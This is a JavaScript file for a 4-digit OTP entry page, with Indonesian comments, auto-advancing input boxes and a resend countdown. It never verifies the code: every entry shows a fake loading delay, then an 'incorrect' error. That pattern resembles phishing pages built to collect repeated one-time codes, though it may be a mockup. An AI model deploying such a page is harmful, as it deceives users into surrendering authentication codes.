/* ========================= */
/* OTP */
/* ========================= */

const otpInputs =
document.querySelectorAll(".otp-box");

const otpContainer =
document.querySelector(".otp-container");

const errorBox =
document.querySelector(".error-box");

const loadingBox =
document.getElementById("loadingBox");

/* HIDE ALERT AWAL */
errorBox.style.display = "none";

/* RESET LOADING */
window.addEventListener("pageshow", () => {

    loadingBox.style.display = "none";

});

/* ========================= */
/* NOMOR OTOMATIS */
/* ========================= */

const savedNumber =
localStorage.getItem("nomorHP");

if(savedNumber){

    document.querySelector(
    ".phone-number"
    ).innerText = savedNumber;

}

/* ========================= */
/* FOKUS KE BOX PERTAMA */
/* ========================= */

otpContainer.addEventListener("click", () => {

    for(let i = 0; i < otpInputs.length; i++){

        if(otpInputs[i].value === ""){

            otpInputs[i].focus();

            return;

        }

    }

    otpInputs[0].focus();

});


/* ========================= */
/* OTP INPUT */
/* ========================= */

otpInputs.forEach((input,index) => {

    input.addEventListener("input", () => {

        input.value =
        input.value.replace(/[^0-9]/g,'');

        /* HIDE ERROR SAAT ISI ULANG */
        errorBox.style.display = "none";

        /* NEXT BOX */
        if(
            input.value.length === 1 &&
            index < otpInputs.length - 1
        ){

            otpInputs[index + 1]
            .focus();

        }

        checkOTP();

    });

    /* BACKSPACE */
    input.addEventListener("keydown", (e) => {

        if(
            e.key === "Backspace" &&
            input.value === "" &&
            index > 0
        ){

            otpInputs[index - 1]
            .focus();

        }

    });

});

/* ========================= */
/* CHECK OTP */
/* ========================= */

function checkOTP(){

    let otp = "";

    otpInputs.forEach(input => {

        otp += input.value;

    });

    /* FULL OTP */
    if(otp.length === 4){

        /* SHOW LOADING */
        loadingBox.style.display =
        "flex";

        /* DELAY */
        setTimeout(() => {

            /* HIDE LOADING */
            loadingBox.style.display =
            "none";

            /* SHOW ERROR */
            errorBox.style.display =
            "block";

            /* SHAKE */
            otpContainer.classList
            .add("shake");

            navigator.vibrate(250);

            setTimeout(() => {

                otpContainer.classList
                .remove("shake");

            },350);

            /* RESET OTP */
            setTimeout(() => {

                otpInputs.forEach(input => {

                    input.value = "";

                });

                otpInputs[0].focus();

            },300);

        },2000);

    }

}


/* ========================= */
/* TIMER */
/* ========================= */

const resendBtn =
document.querySelector(".resend-btn");

const timerText =
document.querySelector(".timer");

let time = 60;

resendBtn.disabled = true;

const countdown =
setInterval(() => {

    let seconds =
    time < 10
    ? "0" + time
    : time;

    timerText.innerText =
    `00:${seconds}`;

    time--;

    if(time < 0){

        clearInterval(countdown);

        timerText.innerText =
        "00:00";

        resendBtn.disabled = false;

        resendBtn.classList
        .add("active");

    }

},1000);

/* ========================= */
/* RESEND */
/* ========================= */

resendBtn.addEventListener("click", () => {

    if(!resendBtn.disabled){

        location.reload();

    }

});
